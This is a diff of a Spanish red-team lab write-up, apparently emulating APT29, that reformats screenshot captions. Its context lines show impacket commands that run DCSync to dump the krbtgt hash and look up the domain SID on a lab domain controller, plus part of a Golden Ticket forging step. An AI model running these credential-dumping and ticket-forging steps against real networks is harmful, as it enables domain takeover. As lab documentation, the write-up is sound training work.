@@ -22,7 +22,7 @@ APT29 utiliza Golden Tickets como mecanismo de persistencia a largo plazo tras c
 
 ## 9.1 — Obtención del hash krbtgt via DCSync
 **Técnica MITRE:** T1003.006 — OS Credential Dumping: DCSync  
-**Captura:** ![fase9-01](../screenshots/FASE-9-Persistence/fase9-01-krbtgt-hash.png)
+> 📸 Captura: ![fase9-01](../screenshots/FASE-9-Persistence/fase9-01-krbtgt-hash.png)
 
 ```bash
 impacket-secretsdump atackcorp.local/backup_svc:'Backup2024!'@10.0.2.10 \
@@ -52,7 +52,7 @@ krbtgt:des-cbc-md5:1075dc8a8916e502
 ---
 
 ## 9.2 — Obtención del Domain SID
-**Captura:** ![fase9-02](../screenshots/FASE-9-Persistence/fase9-02-domain-sid.png)
+> 📸 Captura: ![fase9-02](../screenshots/FASE-9-Persistence/fase9-02-domain-sid.png)
 
 ```bash
 impacket-lookupsid atackcorp.local/backup_svc:'Backup2024!'@10.0.2.10 | head -5
@@ -70,7 +70,7 @@ impacket-lookupsid atackcorp.local/backup_svc:'Backup2024!'@10.0.2.10 | head -5
 
 ## 9.3 — Forja del Golden Ticket
 **Técnica MITRE:** T1558.001 — Steal or Forge Kerberos Tickets: Golden Ticket  
-**Captura:** ![fase9-03](../screenshots/FASE-9-Persistence/fase9-03-golden-ticket-forged.png)
+> 📸 Captura: ![fase9-03](../screenshots/FASE-9-Persistence/fase9-03-golden-ticket-forged.png)
 
 ```bash
 # Forjar con AES256 (preferido por DC modernos)
